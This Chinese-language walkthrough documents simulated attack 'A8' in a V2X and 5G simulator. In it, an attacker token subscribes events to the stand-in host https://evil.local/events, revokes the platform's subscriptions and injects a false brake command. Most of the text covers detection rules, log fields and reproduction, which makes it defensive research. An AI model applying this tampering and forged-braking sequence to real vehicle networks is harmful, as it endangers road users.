# A8 NEF/订阅篡改：代码走读与实现解析

> 代码基线：`feature/trace-watch`（v0.3.0 + A1–A10 TraceProfile），2026-11-03。
> 共享机制见 [A1 §2–§4](A1-感知篡改诱导通信拥塞.md)；本文只写 A8 的差异。
> 目标：解释“NEF 退订 → 平台订阅撤销 → ingest 漏事件 → 云控制动”的代码路径，并说明 stop 的不对称清理。

## 1. 一句话概括

A8 做四件事：

1. 用 NEF 签一个 `nef:subscribe` token，订阅 `denm/spat`，然后立刻退订；
2. 撤销平台当前第一个订阅；
3. 把 `platform_ingest_delay_ms` 设为 80；
4. 直接 `inject_brake(2.5, 1.0)`。

它没有改 NEF 的鉴权策略，也没有阻止平台重新订阅；它只是把已有订阅置为 REVOKED，导致后续 ingest 找不到 `active_for(msg_type)`，从而被标记 `dropped/no_subscription`。

## 2. 端到端调用链

```text
POST /api/attacks {type:"A8", amplitude, duration, start}
  → CampaignA8.start(ctx)                 campaigns.py:672
      ├─ core.nef.issue_token(attacker, nef:subscribe)
      ├─ core.nef.subscribe(denm,spat, evil callback)
      ├─ platform.subs.revoke(第一个订阅)
      ├─ core.nef.unsubscribe(刚建的 NEF 订阅)
      └─ truth.add()
  → CampaignA8.tick(ctx)                  campaigns.py:699
      ├─ extras["platform_ingest_delay_ms"]=80
      └─ 第一次：control.inject_brake(2.5, 1.0)
  → stop(ctx)                             campaigns.py:710
      └─ 如果平台没有 denm 订阅，重新 subscribe(cpm,denm,spat)
```

层序：

```text
scheduler → sensing → v2x → uu → core → auth → platform → control
```

A8 的 `core.nef`/`app.subscription` 在 scheduler 里直接 emit；平台 ingest 在后面的 `platform.tick()` 读取订阅状态。

## 3. 参数

A8 的 `amplitude` 不影响 token、订阅数量、延迟或制动，当前是固定流程。

| 量 | 值 |
|---|---:|
| NEF token scope | `nef:subscribe` |
| NEF 订阅事件 | `denm`, `spat` |
| 平台退订 | 第一个 `platform.subs` |
| 平台延迟 | 80 ms |
| 制动 | 2.5 m/s²，1.0 s |
| 包络 | `unsubscribe_events >= 1` |

## 4. 注入点

### 4.1 NEF token + 订阅 + 退订

```python
token = core.nef.issue_token(ctx, subject="attacker:A8",
    tenant=platform.tenant, scopes=["nef:subscribe"], ttl_s=30.0)
sub = core.nef.subscribe(ctx, token_id=token.token_id,
    event_types=["denm", "spat"], callback="https://evil.local/events")
core.nef.unsubscribe(ctx, token_id=token.token_id, sub_id=sub.sub_id)
```

- `subscribe` 会 emit `core.nef` `api_subscribe`；
- `unsubscribe` 会 emit `core.nef` `api_unsubscribe`，`result=accept`；
- 订阅状态是 `REVOKED`，但没有真实回调、没有通知。
- `issue_token`/`subscribe`/`unsubscribe` 都是语义状态机，不做真实 NEF HTTP 调用。

### 4.2 平台订阅撤销

```python
subs = list(platform.subs.subs.values())
if subs:
    platform.subs.revoke(ctx, subs[0].sub_id)
```

撤销平台启动时创建的第一个订阅；默认订阅是 `cpm,denm,spat`，所以后续 CPM/DENM/SPaT 都会因为没有 active 订阅而被 `dropped`。

### 4.3 平台漏事件

`PlatformLayer.tick()`：

```python
active = self.subs.active_for(msg_type)
self.ingest.ingest(..., dropped=not bool(active),
                   cause=None if active else "no_subscription")
```

这会让 `app.ingest` 的 `result=dropped`、`cause=no_subscription`；它不代表消息在空口丢了，而是平台没有订阅。

### 4.4 制动

```python
control.inject_brake(ctx, self.veh_id, decel=2.5, duration=1.0)
```

`ttc=99`、`reason=injected`。

## 5. 下游消费

| 消费者 | 看到什么 |
|---|---|
| CoreProvider | `core:nef` 的 `unsubscribed=1`、`subscriptions` 状态 |
| Platform | `platform:subscriptions` 有 REVOKED；`app.ingest` 大量 dropped |
| Control | 一条 `control.command` |
| Detector | `subscription_tamper`、`nef_subscription_tamper`、`ingest_latency_spike`、`brake_without_hazard` |
| Trace | `core.nef`、`app.subscription`、`app.ingest`、`control.command` |

## 6. 真值

`CampaignA8.truth()`（[campaigns.py](../../isacsim/attacks/campaigns.py:718)）实测：

```json
{
  "nodes": ["nef:NEF-01", "platform:V2X-01", "tenant:city-a",
            "veh:eastbound.2", "attacker:A8"],
  "domains": ["core", "app", "v2x", "task", "control"],
  "params": {
    "unsubscribed": ["denm", "spat"],
    "victim": "eastbound.2",
    "token": "nef-tok-0001"
  },
  "envelope": {"in_envelope": true, "criterion": "unsubscribe_events >= 1"},
  "stages": [
    {"name": "退订平台/NEF 订阅", "t0": 2.0, "t1": 3.0},
    {"name": "平台漏事件", "t0": 3.0, "t1": 5.0}
  ],
  "causal_chain": [
    "core.nef:unsubscribe",
    "app.subscription:revoke",
    "app.ingest:drop",
    "control.command:inject"
  ]
}
```

`domains` 含 `task`，但代码没有专门的 task 事件；这是声明。

## 7. 检测侧看到了什么

| 规则 | 触发 |
|---|---|
| `subscription_tamper` | `app.subscription.action=revoke, result=accept` |
| `nef_subscription_tamper` | `core.nef.msg_type=api_unsubscribe, result=accept` |
| `ingest_latency_spike` | 平台延迟 82 ms |
| `brake_without_hazard` | ttc=99 |

seed=14、a=0.8、3 s 攻击实测：

```text
subscription_tamper ×1, nef_subscription_tamper ×1,
ingest_latency_spike ×3, brake_without_hazard ×1
```

## 8. 外部检测视角：数据支撑、`/trace` 位置与 `out/` 落点

> 本节假设判定在仿真之外完成：只看导出的观测流与日志，不读 `truth/`、不读 `ctx.extras`。可观测面清单与路径/落盘规则见 [A1 §9.1、§9.4](A1-感知篡改诱导通信拥塞.md)。

### 8.1 判定 A8 需要的数据支撑

A8 先拿到 NEF token、建一个指向外部回调的订阅，再把平台默认订阅撤掉，于是平台“看不见” DENM/SPaT；随后再补一条无依据的制动。判定要把“订阅变更”和“平台漏事件”对齐。

| 观测面 | 需要捕获的字段 | 在判定中的作用 | 可依赖度 |
|---|---|---|---|
| `core.nef` | `msg_type`、`token_id`、`subscription_id`、`event_types`、`callback`、`result`、`subject` | `token_issue(subject=attacker:A8)` → `api_subscribe(callback=https://evil.local/events)` → `api_unsubscribe accept` | 协议证据（关键） |
| `app.subscription` | `action`、`result`、`subscription_id`、`event_types` | 平台默认订阅 `action=revoke, result=accept`，活动订阅数下降 | 协议证据（关键） |
| `app.ingest` | `result`、`cause`、`msg_type`、`source` | `result=dropped`、`cause=no_subscription` 激增，且按 `msg_type` 分布 | 物理证据（关键） |
| `v2x.denm` / `v2x.spat` | `sender_pseudo`、`msg_type`、`cause` | 空口仍有消息 → 平台侧漏事件，不是空口丢包 | 反证（关键） |
| `control.command` | `params.ttc_s`、`src` | `ttc=99`、`src=attacker:ctl-*` | 物理/协议证据 |
| `link.metrics` | `cbr`、`jam` | 不变 → 排除 A1/A2 | 反证 |

判定口径：

```text
R1 core.nef 出现 api_unsubscribe accept，且 token 主体不是平台租户（attacker:A8）、
   回调指向外部域（如 https://evil.local/events）。
R2 app.subscription 出现 revoke accept，active 订阅数下降到 0。
R3 同一 msg_type（denm/spat）在 v2x.* 仍有记录，但 app.ingest 的
   result=dropped/cause=no_subscription 激增。
R4 control.command 的 ttc_s>=10。
=> R1∧R2 判“订阅篡改”；R3 是后果证据（平台视野缺失）；R4 是放大器。
```

边界：

- 没有真实 NEF HTTP 调用与回调投递，`callback` 只是记录字段；
- `stop()` 只恢复平台订阅（重新订阅 cpm/denm/spat），**不**撤销 NEF token，也不恢复 NEF 订阅；`out/` 末尾会多一条 `app.subscription subscribe`；
- `app.ingest.result=dropped` 是平台侧“没有活动订阅”，不是空口丢包；
- 平台延迟是全局的（80 ms），不只是 DENM/SPaT；
- `amplitude` 对 A8 无效。

### 8.2 对应前端 `/trace` 的位置

| 数据 | `/trace` 位置 | 看什么 |
|---|---|---|
| NEF 退订 | **核心网** → `核心网 · Core` 卡 → 子标签「节点」的 NEF 节点；右栏 `core.nef` 事件 | NEF 指标里 `unsubscribed` 上升（本剧本不撤销 token，`revoked` 仍为 0）、红点 reasons `unsubscribed 1`；事件 `api_unsubscribe accept`（`callback` 不在事件白名单） |
| 平台订阅 | **平台** → `平台 · V2X` 卡 → 子标签「订阅」 | `sub-0001` 的 `state=REVOKED`；`callback` 列显示平台侧回调 |
| 漏事件 | 平台概览 `ingest_dropped`；右栏 `app.ingest` 事件 | `result=dropped`、`cause=no_subscription` |
| 制动 | **车辆** → `<victim> · state`；右栏 `control.command` | `decel=2.5`、`ttc=99` |
| 告警 | **总览** → `Detector · alerts`；**底栏时间轴** | `subscription_tamper`、`nef_subscription_tamper`、`ingest_latency_spike`、`brake_without_hazard` |
| 阶段 | 顶栏 **下一步** 后的检查点横幅 | S1 NEF 退订 → S2 平台订阅撤销 → S3 平台漏事件 → S4 云控 → S5 告警 |

不在 `/trace` 上的：NEF 的 `callback` 地址（不在事件字段白名单，只有 `out/core.nef.jsonl` 有）、NEF 订阅表（「订阅」表只显示平台侧）、`v2x.spat` 全量。

### 8.3 对应后端 `out/` 的位置

| 数据 | 文件 | 过滤键 / 字段 | 备注 |
|---|---|---|---|
| NEF 退订 | `core.nef.jsonl` | `.payload.msg_type=="api_unsubscribe"`、`result=="accept"` | 同文件有 `token_issue`/`api_subscribe` |
| 可疑回调 | `core.nef.jsonl` | `.payload.callback` | `https://evil.local/events` |
| 平台订阅撤销 | `app.subscription.jsonl` | `.payload.action=="revoke"`、`result=="accept"` | 末尾还有恢复订阅 |
| 平台漏事件 | `app.ingest.jsonl` | `.payload.result=="dropped"`、`.payload.cause=="no_subscription"` | 按 `msg_type` 分组 |
| 空口对照 | `v2x.denm.jsonl` / `v2x.spat.jsonl` | 同窗口仍有记录 | 证明不是空口丢 |
| 制动 | `control.command.jsonl` | `.payload.params.decel_mps2==2.5` | |
| 真值（评估侧） | `truth/events.jsonl` | `.campaign=="A8"` | `params.unsubscribed/token` |
| 告警 | `alerts.jsonl` | `subscription_tamper` / `nef_subscription_tamper` / `ingest_latency_spike` | 仅 CLI/batch |

```bash
cd out/doc_a8/arterial-14-*
jq -c 'select(.payload.msg_type=="api_subscribe") | {sub:.payload.subscription_id, cb:.payload.callback, et:.payload.event_types}' core.nef.jsonl
jq -c 'select(.payload.action=="revoke") | {sub:.payload.subscription_id, et:.payload.event_types}' app.subscription.jsonl
jq -c 'select(.payload.result=="dropped") | .payload.msg_type' app.ingest.jsonl | sort | uniq -c
```

> A8 的判定关键是“平台侧看不见、空口侧还看得见”：只对比 `app.ingest` 会以为消息丢了，必须拿 `v2x.*` 做对照。

## 9. 时序

| 相对 `t0` | 事件 |
|---:|---|
| 0 | NEF 发 token/订阅/退订；平台退订第一个 sub |
| +0.05 | `app.ingest` 开始 dropped/no_subscription |
| +0.05 | 制动 `control.command` |
| +0.1 | 平台延迟告警 |
| `t1` | 平台若没有 denm 订阅，重新订阅 cpm/denm/spat |

## 10. 边界与差异

1. **不是真实 NEF**：没有 HTTP 回调、没有通知投递。
2. **`stop` 只恢复平台订阅**：不撤销 NEF token，也不恢复 NEF 订阅；`core:nef` 里那条 `api_unsubscribe` 仍保持 REVOKED。
3. **平台延迟是全局的**：所有 ingest 都慢，不只是 DENM/SPaT。
4. **`app.ingest.result=dropped` 是平台侧无订阅**，不是空口丢包。
5. **`amplitude` 无效**：A8 的订阅/延迟/制动固定。
6. **A8 没有 `stop()` 外的清理**：如果 cancel，只置 finished，平台订阅可能保持撤销。

## 11. 复现与检查

```bash
.venv/bin/python -m isacsim run \
  --seed 14 -a A8 --duration 8 --attack-duration 3 \
  --attack-start 2 --amplitude 0.8 --out out/doc_a8
```

| 文件 | 看什么 |
|---|---|
| `core.nef.jsonl` | `api_unsubscribe`、`result=accept` |
| `app.subscription.jsonl` | `action=revoke`、`result=accept` |
| `app.ingest.jsonl` | `result=dropped`、`cause=no_subscription` |
| `control.command.jsonl` | `decel_mps2=2.5`、`ttc=99` |
| `truth/events.jsonl` | `params.unsubscribed/token` |
| `alerts.jsonl` | `subscription_tamper`、`nef_subscription_tamper` |

## 12. 代码索引

| 作用 | 位置 |
|---|---|
| A8 类与 `start/tick/stop/truth` | `isacsim/attacks/campaigns.py:659`, `:672`, `:699`, `:710`, `:718` |
| NEF token/订阅/退订 | `isacsim/layers/core/nef.py:26`, `:62`, `:99` |
| 平台订阅撤销 | `isacsim/layers/platform/subscription.py:35` |
| 平台 ingest | `isacsim/layers/platform/ingest.py:42` |
| `subscription_tamper` / `nef_subscription_tamper` | `isacsim/detect/reference.py:233`, `:238` |
| A8 真值链 | `isacsim/truth/model.py:40` |
| A8 profile | `isacsim/trace/profiles.py:325` |

## 13. 小结

```text
NEF 订阅 → 退订（api_unsubscribe）
        │
平台第一个订阅 → revoke
        │
app.ingest 无 active 订阅 → dropped/no_subscription
        │
inject_brake(2.5) → brake_without_hazard
```

A8 的核心是“让平台收不到关键事件”，而不是“让消息在空口丢失”。检测看的是订阅状态变更和 ingest 的 `no_subscription` 原因。
